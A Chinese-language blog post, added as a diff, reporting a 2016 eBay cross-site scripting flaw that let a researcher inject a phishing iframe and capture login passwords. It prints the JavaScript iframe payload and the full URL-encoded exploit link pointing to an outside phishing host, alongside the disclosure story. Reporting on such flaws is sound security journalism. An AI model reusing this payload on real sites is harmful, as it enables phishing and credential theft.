@@ -1,0 +1,65 @@
+---  
+layout: post  
+title: "跨站脚本漏洞，ebay中枪！"
+date: 2016-01-13
+categories:  传媒信安     
+comments: true
+description: 号外！号外！ebay网竟潜存着一个简单有效的漏洞，导致亿万用户遭受高级网络钓鱼攻击。
+tags:
+    - 传媒信安
+---  
+![](http://127.0.0.1:4000//resources/images/Y1.png) 
+
+号外！号外！ebay网竟潜存着一个简单有效的漏洞，导致亿万用户遭受高级网络钓鱼攻击。
+
+独立安全研究人员报告，上个月，这个ebay的严重漏洞可能让黑客在ebay网站上构建一个虚假的登录页面，即钓鱼页面，用于盗取数以百万计的用户密码和收获凭据。
+
+研究人员，绰号MLT说，任何人都可以利用漏洞，通过发送钓鱼邮件给目标eBay用户，以接管他们的帐户或收获数千，甚至上百万的ebay客户证书。
+
+HMLT发表了一篇关于ebay漏洞的博客文章
+
+```
+（https://ret2libc.wordpress.com/2016/01/11/a-tale-of-ebay-xss-and-shoddy-incident-response/）
+```
+，证明它是多么容易被利用，从而窃取用户的密码。
+
+Here's How ebay Hack Works：
+
+该漏洞实际上寄生在URL参数中，允许黑客向合法的ebay网站上注入了他的iFrame。
+
+这是一种常见的网络bug，技术上称为**跨站脚本（XSS）漏洞**，攻击者可以利用该漏洞将恶意代码注入到合法网站。
+
+MLT拥有一个iframe链接到自己的第三方网络钓鱼页面，其中包含eBay的正规网址，这使得它看起来像在登录“ 合法的ebay网站 ”。
+
+登录页面看起来与ebay的实际登录界面几乎完全一样，除了自定义URL的第二部分，这才是大多数用户不熟知的。
+
+在这种情况下，将含有研究者的钓鱼页面的IFRAME注入到使用以下有效载荷的页面：
+
+
+```
+document.write(‘<iframec=”http://45.55.162.179/ebay/signin.ebay.com/ws/eBayISAPI9f90.html” width=”1500″ height=”1000″>’)
+```
+
+
+下面是完整的URL，包括上述的有效载荷，再注入时间：
+
+
+```
+http://ebay.com/link/?nav=webview& url=javascript:document.write%28%27%3Ciframe%20src=%22http://45.55.162.179/ebay/signin.ebay.com/ws/eBayISAPI9f90.html%22%20width=%221500%22%20height=%221000%22%3E%27%29
+```
+
+
+这个URL的截图：
+
+![](http://127.0.0.1:4000//resources/images/Y2.png) 
+
+ 经过这样做，MLT在被感染的网站输入自己的用户名和密码，并登录，这会得到错误提示。但与此同时，他能够偷到用户输入的明文口令。
+视频演示
+
+MLT也提供了证明的概念视频，展示了这个安全漏洞的实时性。你可以在Youtube看下视频(https://www.youtube.com/watch?v=WuZ61NWbK_4)。
+
+MLT负责任的报道了12月11日ebay的该漏洞，第二天，该公司只停止了研究人员的电子邮件响应，但并没有发布补丁，甚至不知道该漏洞的后果。
+
+然而，当媒体联系ebay询问有关漏洞时，公司火速发布补丁，并承认MLT关于其发现的网站页面，感谢白帽黑客致力于报告错误。
+
+[阅读原文](http://thehackernews.com/2016/01/ebay-hacking.html#rd?sukey=7f8f3cb2e9b0da45ef1ed2de750a85a1e06c1d33354ff08cd1a90dbd746357ad81f42addec21e240325b39164c9a31cb)
